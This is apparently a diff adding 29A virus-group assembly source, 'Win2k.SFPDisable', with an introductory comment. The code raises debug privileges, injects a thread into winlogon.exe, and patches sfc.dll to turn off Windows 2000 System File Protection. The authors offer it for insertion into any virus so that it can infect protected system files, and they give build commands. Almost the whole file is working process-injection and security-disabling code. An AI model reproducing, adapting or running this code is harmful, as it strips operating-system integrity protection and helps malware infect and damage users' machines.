@@ -1,0 +1,388 @@
+
+COMMENT#
+                       	ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                       	³   Win2k.SFPDisable   ³
+                       	ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+                     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                     ³ by Benny/29A and Ratter/29A ³
+                     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+Well, how to start?
+In the past, there were many ideaz how to get rid off that new feature of
+Windows 2000 - The System File Protection. GriYo/29A was the first one who
+warned us and solved that problem very smartly. Using SfcIsFileProtected API
+that can tell us if the file is or is not protected by operating system.
+Viruses used this API and if file was protected, they simply did not infect
+it.
+
+Next step? Disabling SFP. Someone, I can't remember who was it, found out
+that setting HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+\Winlogon\SFCDisable to 0xFFFFFFFD disabled SFP in the next restart. In some
+version it worked, in some it didn't. Also, there was idea to overwrite sfp
+protected filez storage, but it worked only from different running OS. The
+question was still the same - how to get rid off that fucking SFP, right
+here, right now?
+
+Well, we have to know our enemy if we want to defeat him. At the start,
+winlogon.exe (the process that handles logining, shutdown and such shitz, it
+can be called like main user-level process of the system) loadz sfc.dll
+library. Sfc.dll at its initialization process loadz sfcfilez.dll that
+containz list of all protected filez. Sfc.dll will get the list and storez
+it in its own buffer. Winlogon.exe then registerez the file notification
+object and every time the directory will change in some aspect (file erase,
+file rename etc...), it will pass the control to sfc.dll, that will check
+what file was changed and if it is protected by SFP. If so, it will try to
+repair that file.
+
+Our idea was - patch the winlogon.exe, sfc.dll or sfcfiles.dll in the memory.
+But there was a small problem - how to write to service program, it's forbidden
+by system. After some disassembling and looking at MSDN we found out how to do
+it - adjust debugger access rightz to our process. After that we can do whatever
+will we want to do with ALL processes in the system, except the system itself.
+Well, that's what I call secure system, hehe.
+
+The final step was to find out where and what exactly should we patch. will it
+be winlogon.exe? Or Sfc.dll? Or Sfcfiles.dll? After many hourz of researching
+we found it. In loaded library "sfc.dll" (in winlogon.exe process) there is
+a code:
+
+		push	0
+		push	1
+		push	1
+		push	dword ptr [ebx]
+		push	dword ptr [ebx+4]
+		call	NtWaitForMultipleObjects
+----->		test	eax, eax                  <----- !!! PATCH HERE !!!
+		jl	loc_76934195
+		jz	loc_76934195
+		cmp	eax, 102h
+		jz	short loc_7693408B
+		cmp	eax, [ebx+4]
+		jnb	loc_76934195
+
+
+If we will patch the code by ExitThread API call, the process of file
+checking will be aborted. Since this time, SFP will become DISABLED!
+Simple, eh? ;-)
+
+
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³ Algorithm of this program ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+1) Adjust higher priviledgez to our process, by legit API way.
+2) Find Winlogon.exe in memory.
+3) Alocate memory there, copy there a small "path" code and run it there.
+4) Quit.
+
+In the winlogon.exe will be created new thread which will:
+
+1) Find the code written above.
+2) Patch the code by ExitThread(0) call. If the page is protected,
+   unprotect it then.
+3) Quit.
+
+It soundz very simply, but believe us, it 100%-ly worx! This very useful
+code can be easily inserted to any virus, into some init. procedure of the
+virus. Virus will be able to infect ALL system filez (except those already
+used ofcoz) and that IS very useful.
+
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³ How to compile it? ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+tasm32 /ml /m9 /q sfp
+tlink32 -Tpe -c -x -aa sfp,,,import32,sfp
+pewrsec sfp.exe
+
+
+
+We hope you will like our code. Enjoy it!
+
+
+			Benny/29A  -	http://benny29a.cjb.net, benny@post.cz
+			Ratter/29A -	http://ratter.cjb.net, ratter@atlas.cz
+#
+
+
+.386p
+.model	flat
+
+include	win32api.inc
+include	useful.inc
+include	mz.inc
+include	pe.inc
+
+
+@pushvar	macro	variable, empty			;macro for pushing
+	local   next_instr				;variablez of any type
+	ifnb <empty>
+	%out too much arguments in macro '@pushvar'
+	.err
+	endif
+	call next_instr
+	variable
+next_instr:
+endm
+
+
+invoke	macro	api					;macro for API callz
+	extrn	api:PROC				;declare API
+	call	api					;call it...
+endm
+
+
+@SEH_SetupFrame_UnProtect	macro
+	local	set_new_eh
+	local	exception_handler
+
+	call	set_new_eh
+	pushad
+
+	mov	ebx,dword ptr [esp+cPushad+EH_ExceptionRecord]
+	cmp	dword ptr [ebx.ER_ExceptionCode],EXCEPTION_ACCESS_VIOLATION
+        jne	exception_handler
+
+	@pushvar	<dd	?>
+	mov	ebx,[ebx.ER_ExceptionInformation+4]
+	push	PAGE_READWRITE
+	and	ebx,0FFFFF000h
+	push	2*4096
+	push	ebx
+	mov	eax,12345678h
+virtual_protect_api = dword ptr $-4
+	call	eax					;unprotect 2 pagez
+
+exception_handler:
+	popad
+	xor	eax,eax
+	ret
+
+set_new_eh:						;set SEH frame
+	xor	edx,edx
+	push	dword ptr fs:[edx]
+	mov	fs:[edx],esp
+endm
+
+
+.data							;some variablez
+	token_priv	dd	1
+	p_luid		dq	?
+			dd	2
+	procz		dd	80h dup (?)
+			dd	?
+	modz		dd	?
+	mod_name	db	MAX_PATH dup (?)
+	p_token		dd	?
+	tmp		dd	?
+
+.code							;worm code starts 
+Start:	pushad
+	@SEH_SetupFrame <jmp end_seh>			;setup SEH frame
+
+	extrn	GetModuleHandleA:PROC
+	mov	eax,dword ptr [GetModuleHandleA+2]
+	mov	eax,[eax]
+	mov	[gmha],eax				;store address of API
+
+        extrn	VirtualProtect:PROC
+	mov	eax,dword ptr [VirtualProtect+2]
+	mov	eax,[eax]
+	mov	[virtual_protect_api],eax		;--- "" ---
+
+	extrn	ExitThread:PROC
+	mov	eax,dword ptr [ExitThread+2]
+	mov	eax,[eax]
+	mov	[exitthread_api],eax			;--- "" ---
+
+        invoke	GetCurrentProcess
+	push	offset p_token
+	push	20h
+	push	eax
+	invoke	OpenProcessToken			;open token of our process
+	dec	eax
+	jne	err_ap
+
+	push	offset p_luid
+	@pushsz	'SeDebugPrivilege'
+	push	eax
+	invoke	LookupPrivilegeValueA			;find LUID for this priv.
+	dec	eax
+	jne	err_ap
+
+	push	eax
+	push	eax
+	push	10h
+	push	offset token_priv
+	push	eax
+	push	[p_token]
+	invoke	AdjustTokenPrivileges			;adjust higher priviledges
+							;for our process
+	mov	esi,offset procz
+	push	offset tmp
+	push	80h
+	push	esi
+	invoke	EnumProcesses				;enumerate all running processes
+	dec	eax
+	jne	end_seh
+	add	esi,4
+
+p_search:
+	lodsd						;get PID
+	test	eax,eax
+	je	end_seh
+	call	analyse_process
+	jc	p_search
+
+end_seh:@SEH_RemoveFrame				;remove SEH frame
+	popad
+	push	0
+	invoke	ExitProcess				;and quit
+
+
+analyse_process	Proc
+	pushad
+	push	eax
+	push	0
+	push	43Ah
+	invoke	OpenProcess				;PID -> handle
+	test	eax,eax
+	je	err_ap
+	mov	[hProcess],eax
+	push	eax
+
+	push	eax
+	mov	esi,offset modz
+	push	offset tmp
+	push	4
+	push	esi
+	push	eax
+	invoke	EnumProcessModules			;get first (main) module
+	pop	ecx
+	dec	eax
+	jne	err_ap1
+
+	lodsd
+	mov	edi,offset mod_name
+	push	MAX_PATH
+	push	edi
+	push	eax
+	push	ecx
+	invoke	GetModuleBaseNameA			;get its name
+	xchg	eax,ecx
+	jecxz	err_ap1
+
+	@pushsz	'winlogon.exe'
+	pop	esi
+	rep	cmpsb
+	jne	err_ap1					;quit if its not winlogon
+        
+        push	PAGE_READWRITE
+	push	MEM_RESERVE or MEM_COMMIT
+	push	end_rroutine-start_rroutine
+	push	0
+	push	12345678h
+hProcess = dword ptr $-4
+	invoke	VirtualAllocEx				;aloc there a memory
+	test	eax,eax
+	je	err_ap1
+	xchg	eax,ebx
+
+	push	0
+	push	end_rroutine-start_rroutine
+	push	offset start_rroutine
+	push	ebx
+	push	[hProcess]
+	invoke	WriteProcessMemory			;write there our code
+	dec	eax
+	jne	free_mem
+
+	xor	edx,edx
+	push	edx
+	push	edx
+	push	edx
+	push	ebx
+	push	edx
+	push	edx
+	push	[hProcess]
+	invoke	CreateRemoteThread			;run it
+	push	eax
+	invoke	CloseHandle
+
+	invoke	CloseHandle
+	popad
+	clc
+	ret
+err_ap1:invoke	CloseHandle
+err_ap:	popad
+	stc
+	ret
+free_mem:
+	push	MEM_RELEASE
+	push	0
+	push	ebx
+	push	[hProcess]
+	invoke	VirtualFreeEx				;free memory
+	jmp	err_ap1
+analyse_process	EndP
+
+
+start_rroutine	Proc
+	pushad
+
+	@SEH_SetupFrame_UnProtect			;set SEH frame
+
+	@pushsz	'sfc.dll'
+	mov	eax,12345678h
+gmha = dword ptr $-4
+	call	eax					;get sfc.dll address
+	test	eax,eax
+	je	end_rseh
+	xchg	eax,esi
+
+	mov	eax,[esi.MZ_lfanew]
+	add	eax,esi
+	movzx	edx,word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
+	lea	edx,[edx+eax+(3*IMAGE_SIZEOF_FILE_HEADER)]
+	mov	ecx,[edx.SH_SizeOfRawData]		;get size of section
+
+	call	@s_str
+@b_str:	db	6Ah,01h,6Ah,01h,0FFh,33h,0FFh,73h,04h,0FFh,15h	;code to search & patch
+@s_str:	pop	edi
+s_str:	pushad
+	push	@s_str-@b_str
+	pop	ecx
+	rep	cmpsb					;search for code
+	popad
+	je	got_addr
+	inc	esi
+	loop	s_str
+	jmp	end_rseh
+
+got_addr:
+	call e_next
+
+s_next:	push 0						;"patch" code
+	mov eax, 12345678h
+exitthread_api = dword ptr $-4
+	call eax
+
+e_next:	pop edi
+	xchg	esi,edi
+	add	edi,15
+        mov ecx,e_next-s_next
+        rep movsb					;patch sfc.dll code by our code
+
+end_rseh:
+	@SEH_RemoveFrame
+	popad
+	ret						;and quit
+
+end_rroutine:
+start_rroutine	EndP
+
+ends
+End	Start
